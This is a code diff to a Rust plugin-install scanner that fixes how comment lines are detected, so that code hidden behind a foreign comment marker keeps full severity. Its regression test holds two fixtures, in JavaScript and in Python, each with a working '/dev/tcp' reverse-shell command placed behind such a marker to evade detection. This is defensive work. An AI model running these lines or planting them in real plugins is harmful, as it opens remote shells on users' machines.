@@ -3,8 +3,9 @@
 //!
 //! Every install and update scans the staged plugin tree with the skills
 //! guard's pattern engine ([`pmt_skills::scan::PatternScanner`]). Prose a
-//! person reads (documentation, changelogs), comment lines and test
-//! fixtures cannot run, so a finding there is lowered one step, but it is
+//! person reads (documentation, changelogs), whole-line comments in the
+//! file's own language (see [`comments`]) and test fixtures cannot run, so
+//! a finding there is lowered one step, but it is
 //! never dropped from the report; bundled skills and other text the agent
 //! reads keep full severity, since the model follows them. `dangerous` is
 //! refused whatever the flags say, `caution` needs a yes on the terminal or
@@ -18,14 +19,14 @@ use pmt_plugins::install::Staged;
 use pmt_plugins::record::Flags;
 use pmt_skills::scan::{PatternScanner, Report, Scanner as _, Verdict};
 
+mod comments;
+
 /// Text the agent reads: a finding there keeps its severity.
 const AGENT_READ: &[&str] = &["SKILL.md", "AGENTS.md", "CLAUDE.md", "plugin.toml"];
 /// Prose for people.
 const PROSE_EXTENSIONS: &[&str] = &["md", "markdown", "txt", "rst", "adoc"];
 /// Directories holding test fixtures.
 const TEST_DIRS: &[&str] = &["test", "tests", "fixtures", "testdata", "__tests__"];
-/// Line comment markers of the scripting languages plugins ship.
-const COMMENT_MARKERS: &[&str] = &["#", "//", "--", ";", "/*", "*", "<!--", "rem "];
 /// The largest file read (bigger files are scanned up to this many bytes).
 const MAX_FILE_BYTES: u64 = 4 * 1024 * 1024;
 
@@ -164,12 +165,11 @@ pub(crate) fn scan(dir: &Path) -> Result<Report, String> {
         .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
         .collect();
     for finding in &mut report.findings {
-        let line = texts
+        let text = texts
             .get(finding.file.as_str())
             .and_then(|bytes| std::str::from_utf8(bytes).ok())
-            .and_then(|text| text.lines().nth(finding.line.saturating_sub(1)))
             .unwrap_or_default();
-        if lowered(&finding.file, line) {
+        if lowered(&finding.file, text, finding.line) {
             finding.severity = lower(finding.severity);
         }
     }
@@ -220,8 +220,9 @@ fn read_capped(path: &Path) -> std::io::Result<Vec<u8>> {
     Ok(bytes)
 }
 
-/// Whether a finding in `file` on `line` is lowered one step.
-fn lowered(file: &str, line: &str) -> bool {
+/// Whether a finding in `file` (contents `text`) on `line` is lowered one
+/// step.
+fn lowered(file: &str, text: &str, line: usize) -> bool {
     let parts: Vec<&str> = file.split('/').collect();
     let name = parts.last().copied().unwrap_or_default();
     if parts.first() == Some(&"skills") || AGENT_READ.contains(&name) {
@@ -238,15 +239,7 @@ fn lowered(file: &str, line: &str) -> bool {
         .any(|d| TEST_DIRS.contains(d))
         || lower_name.starts_with("test_")
         || lower_name.contains("_test.");
-    prose || changelog || fixture || is_comment(line)
-}
-
-fn is_comment(line: &str) -> bool {
-    let trimmed = line.trim_start();
-    !trimmed.starts_with("#!")
-        && COMMENT_MARKERS
-            .iter()
-            .any(|marker| trimmed.to_ascii_lowercase().starts_with(marker))
+    prose || changelog || fixture || comments::is_comment(name, text, line)
 }
 
 const fn lower(severity: Verdict) -> Verdict {
@@ -296,6 +289,31 @@ mod tests {
                 .findings
                 .iter()
                 .all(|f| f.severity == Verdict::Caution)
+        );
+    }
+
+    #[test]
+    fn code_behind_a_foreign_comment_marker_keeps_full_severity() {
+        // Regression: `/**/` and `*` once made any line a "comment".
+        let dir = tree(&[
+            (
+                "setup.js",
+                "/**/ require(\"child_process\").execSync(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
+            ),
+            (
+                "setup.py",
+                "*_, = [__import__(\"os\").system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")]\n",
+            ),
+        ]);
+        let report = scan(dir.path()).unwrap();
+        assert_eq!(report.verdict, Verdict::Dangerous);
+        assert!(
+            report
+                .findings
+                .iter()
+                .all(|f| f.severity == Verdict::Dangerous),
+            "{:?}",
+            report.findings
         );
     }
 
